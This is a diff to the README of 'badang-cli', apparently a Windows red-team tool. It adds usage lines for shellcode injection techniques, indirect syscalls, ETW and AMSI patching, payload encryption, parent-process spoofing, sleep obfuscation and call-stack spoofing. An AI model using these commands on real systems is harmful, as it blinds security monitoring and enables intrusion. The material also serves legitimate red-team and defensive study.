@@ -27,14 +27,54 @@ badang-cli inject --pid 1234 --technique apc --payload rev.bin -x -c
 badang-cli inject --pid 1234 --technique hijack --payload rev.bin -x -c
 badang-cli inject --technique earlybird --payload rev.bin -x -c           # no PID needed
 badang-cli inject --pid 1234 --technique section --payload rev.bin -x -c
+badang-cli inject --technique callback --payload rev.bin -x -c            # no PID needed
+badang-cli inject --technique stomp --payload rev.bin -x -c               # no PID needed
 ```
 
-Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`
+Techniques: `createremote`, `apc`, `hijack`, `earlybird`, `section`, `callback`, `stomp`
 
 ### Syscall
 ```bash
 badang-cli syscall --func NtCreateThreadEx -n
 badang-cli syscall --func NtAllocateVirtualMemory -x -c
+badang-cli syscall --func NtCreateThreadEx --indirect -x -c              # Hell's Gate / Halo's Gate
+```
+
+### ETW
+```bash
+badang-cli etw -x -c                                    # patch EtwEventWrite
+badang-cli etw --patch EtwEventWriteFull -x -c
+badang-cli etw --patch NtTraceEvent -x -c
+```
+
+### AMSI
+```bash
+badang-cli amsi -x -c                                   # patch AmsiScanBuffer
+badang-cli amsi --patch AmsiScanString -x -c
+```
+
+### Encrypt
+```bash
+badang-cli encrypt --payload rev.bin --method xor --key A -o encrypted.bin
+badang-cli encrypt --payload rev.bin --method rc4 --key "secretkey" -o encrypted.bin
+```
+
+### PPID
+```bash
+badang-cli ppid --parent explorer.exe --child notepad.exe -x -c
+badang-cli ppid --parent-pid 1234 --child cmd.exe --suspended -x -c
+```
+
+### Sleep
+```bash
+badang-cli sleep --method manual --duration 5000 -x -c
+badang-cli sleep --method ekko --duration 3000 -x -c
+```
+
+### Spoof
+```bash
+badang-cli spoof --demo NtAllocateVirtualMemory -x -c
+badang-cli spoof --demo NtCreateThreadEx -x -c
 ```
 
 ### Unhook
@@ -76,3 +116,14 @@ badang-cli load --payload shellcode.bin
 | `--input` | `-i` | Bytes to convert |
 | `--format` | `-f` | Format: auto/hex/c/python/rust/decimal |
 | `--verbose` | `-v` | Verbose output |
+| `--indirect` | | Use indirect syscall (Hell's Gate) |
+| `--patch` | | Target function to patch (etw/amsi) |
+| `--method` | | Encrypt/sleep method |
+| `--key` | | Encryption key |
+| `--parent` | | Parent process name (ppid) |
+| `--parent-pid` | | Parent process PID (ppid) |
+| `--child` | | Child command (ppid) |
+| `--suspended` | | Create suspended (ppid) |
+| `--duration` | | Sleep duration in ms |
+| `--demo` | | Target function (spoof) |
+| `--filter` | | Process name filter (scan) |
